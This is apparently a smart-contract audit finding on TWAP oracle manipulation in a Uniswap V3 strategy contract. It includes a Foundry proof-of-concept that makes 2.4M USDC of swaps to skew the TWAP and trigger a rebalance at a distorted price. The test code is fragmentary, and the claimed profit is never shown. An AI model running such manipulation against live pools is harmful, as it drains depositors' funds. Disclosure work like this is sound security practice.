# TWAP Oracle Manipulation in Strategy.sol

### Summary

The reliance on a manipulable TWAP (Time-Weighted Average Price) oracle will cause incorrect price calculations for the strategy and its users, as an attacker will execute large swaps to manipulate the TWAP, allowing rebalancing at a distorted price and potential profit extraction.

### Root Cause

The choice to use Uniswap's TWAP as a price oracle is a mistake, as the price can be manipulated by executing large swaps, shifting the spot price, and waiting for the TWAP to adjust accordingly. This allows an attacker to distort the price used for rebalancing, leading to incorrect fund allocations.

### Internal Pre-conditions

1. The strategy must use Uniswap’s TWAP as its price oracle to determine asset values for rebalancing.
2. The attacker must have access to sufficient USDC liquidity (at least 2.4M USDC) to execute large swaps.
3. The Uniswap V3 pool must allow trades large enough to significantly impact the spot price, causing it to deviate from the TWAP price.
4. The TWAP update mechanism must allow gradual manipulation over time, meaning the attacker can execute multiple swaps to shift the TWAP price rather than being immediately corrected.
5. The strategy must allow rebalancing using the manipulated TWAP price, without enforcing a strict spot price check or additional validation mechanisms.
6. The deviation threshold (maxDeviation) must be high enough to permit an attacker-induced TWAP shift without triggering safeguards.

### External Pre-conditions

1. The Uniswap V3 price oracle must calculate TWAP over a time window that allows gradual manipulation
2. Uniswap’s liquidity conditions must allow significant spot price deviation—low liquidity in the affected trading pair will make manipulation easier.
3. The Ethereum network must process transactions without significant delays, allowing the attacker to execute swaps in quick succession to influence the TWAP before external traders correct the price.
4. No external arbitrageurs must correct the manipulated price in time, ensuring the TWAP remains skewed long enough for the attacker to exploit the strategy.
5. Gas fees must remain low enough for the attacker to afford multiple swaps, preventing transaction costs from outweighing the profit from manipulation.

### Attack Path

1. The attacker funds their wallet with sufficient USDC (at least 2.4M USDC) to execute the manipulation.
2. The attacker calls swap() on the Uniswap V3 pool, executing multiple large swaps in succession to push the spot price in the desired direction.
3. The attacker waits for the TWAP to adjust, allowing the manipulated spot price to influence the TWAP calculation over time.
4. The attacker checks the new TWAP value using _getTwapTick() to ensure the manipulation was successful.
5. he strategy calls rebalance(), using the manipulated TWAP price to reallocate assets.
6. The attacker profits from the rebalance operation, which now occurs at a distorted price, allowing them to extract value from the strategy.
7. The attacker can repeat the process, executing additional swaps to further manipulate the price and continue extracting profits.

### Impact

The strategy's users suffer an approximate loss of funds due to mispriced rebalancing, leading to potential arbitrage opportunities for the attacker. The attacker gains profits from manipulating the price and forcing the strategy to rebalance at a distorted valuation.

    // Test accounts
    address owner = address(0x1);

    function setUp() public {
        // No fork creation here - it's handled by the command line
        
        // Set pool
        pool = IUniswapV3Pool(UNISWAP_POOL);
        
        // Set up roles
        vm.startPrank(owner);
        
        // Deploy vault and strategy
        vault = address(new Vault(WBTC, USDC));
        strategy = address(new Strategy(address(pool), vault, rebalancer, feeRecipient));
        
        // Set strategy in vault

        // Fund user with tokens for initial deposit
        deal(WBTC, user, 1e8); // 1 WBTC
        deal(USDC, user, 100_000e6); // $100,000 USDC
        
        vm.stopPrank();
        
        // User makes initial deposit
        vm.startPrank(user);
        IERC20(WBTC).approve(vault, type(uint256).max);
        IERC20(USDC).approve(vault, type(uint256).max);
        IVault(vault).deposit(1e8, 100_000e6, 0, 0);
        vm.stopPrank();
        
        // Rebalancer performs initial rebalance
        vm.startPrank(rebalancer);
        skip(10 minutes);
        IStrategy(strategy).rebalance();
        vm.stopPrank();
        
        // Fund attacker with USDC for swap
        deal(USDC, attacker, 10_000_000e6); // $10M USDC
    }
    
    function testPriceOracleManipulation() public {
        console2.log("===== PRICE ORACLE MANIPULATION VULNERABILITY PROOF OF CONCEPT =====");
        
        // Step 1: Record initial state
        (uint160 initialSqrtPriceX96, int24 initialTick, , , , , ) = pool.slot0();
        int24 initialTwapTick = _getTwapTick();
        console2.log("Initial spot tick:", initialTick);
        console2.log("Initial TWAP tick:", initialTwapTick);
        
        // Check if strategy can rebalance initially
        skip(6 minutes); // Wait minimum rebalance time
        bool canRebalanceInitially = _canStrategyRebalance();
        console2.log("Strategy can rebalance with normal price:", canRebalanceInitially);
        
        // Step 2: Execute price manipulation attack
        console2.log("\nExecuting price manipulation attack...");
        _executeAttack();
        
        // Step 3: Record manipulated price
        (uint160 manipulatedSqrtPriceX96, int24 manipulatedTick, , , , , ) = pool.slot0();
        console2.log("Manipulated spot tick:", manipulatedTick);
        
        // Step 4: Wait for half the TWAP window to allow manipulation to affect TWAP
        console2.log("Waiting for manipulation to affect TWAP...");
        skip(twapWindow / 2);
        
        // Step 5: Check TWAP after manipulation
        int24 manipulatedTwapTick = _getTwapTick();
        console2.log("Manipulated TWAP tick:", manipulatedTwapTick);
        
        // Step 6: Check if strategy can still rebalance with manipulated price
        bool canRebalanceManipulated = _canStrategyRebalance();
        console2.log("Strategy can rebalance with manipulated price:", canRebalanceManipulated);
        
        // Calculate percentage of manipulation relative to deviation limit
        int24 tickTwapDeviation = 200; // From strategy.sol
        int24 twapTickDifference = manipulatedTwapTick - initialTwapTick;
        uint256 manipulationPercentage = (uint256(uint24(abs(twapTickDifference))) * 100) / uint256(uint24(tickTwapDeviation));
        console2.log("TWAP tick changed by:", twapTickDifference);
        console2.log("Manipulation is", manipulationPercentage, "% of maximum allowed deviation");
        
        // Step 7: Execute the rebalance with manipulated price
        if (canRebalanceManipulated) {
            console2.log("\nExecuting rebalance with manipulated price...");
            vm.startPrank(rebalancer);
            IStrategy(strategy).rebalance();
            vm.stopPrank();
            console2.log("Rebalance successful using manipulated price!");
        }

        assertTrue(abs(twapTickDifference) > 0, "TWAP was manipulated");
        assertTrue(abs(twapTickDifference) < tickTwapDeviation, "Manipulation stays within allowed deviation");

        assertTrue(canRebalanceManipulated, "Strategy accepts manipulated price");
        
    }
    
    /**
     * @notice Execute the price manipulation attack
     */
    function _executeAttack() internal {
        vm.startPrank(attacker);
        
        // Approve USDC for swapping
        IERC20(USDC).approve(UNISWAP_ROUTER, type(uint256).max);
        
        // Multiple smaller swaps in succession for greater TWAP impact
        for (uint i = 0; i < 3; i++) {
            ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
                tokenIn: USDC,
                tokenOut: WBTC,
                fee: 3000,
                recipient: attacker,
                deadline: block.timestamp + 60,
                amountIn: 800_000e6, // Multiple smaller swaps
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });
        
            ISwapRouter(UNISWAP_ROUTER).exactInputSingle(params);
            // Small delay between swaps
            skip(30);
        }
    
        console2.log("Attacker executed multiple swaps totaling 2.4M USDC");
        vm.stopPrank();
    }
    
    /**
     * @notice Get the current TWAP tick from the pool
     * @return The time-weighted average tick
     */
    function _getTwapTick() internal view returns (int24) {
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = twapWindow; // 5 minutes ago
        secondsAgos[1] = 0; // Now
        
        (int56[] memory tickCumulatives, ) = pool.observe(secondsAgos);
        
        // Calculate time-weighted average tick
        int56 tickCumulativesDelta = tickCumulatives[1] - tickCumulatives[0];
        int24 avgTick = int24(tickCumulativesDelta / int56(uint56(twapWindow)));
        
        return avgTick;
    }
    
    /**
     * @notice Helper function to check if the strategy can rebalance
     * @return Whether the strategy can rebalance
     */
    function _canStrategyRebalance() internal view returns (bool) {
        // Check if the strategy can rebalance by calling price() function
        try IStrategy(strategy).price() returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }
    
    /**
     * @notice Helper function to get absolute value of int24
     * @param x The number to get absolute value of
     * @return The absolute value
     */
    function abs(int24 x) internal pure returns (int24) {
        return x < 0 ? -x : x;
    }
}

// Interface definitions to match what's used in the protocol
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    
    function exactInputSingle(ExactInputSingleParams calldata params) external returns (uint256 amountOut);
}
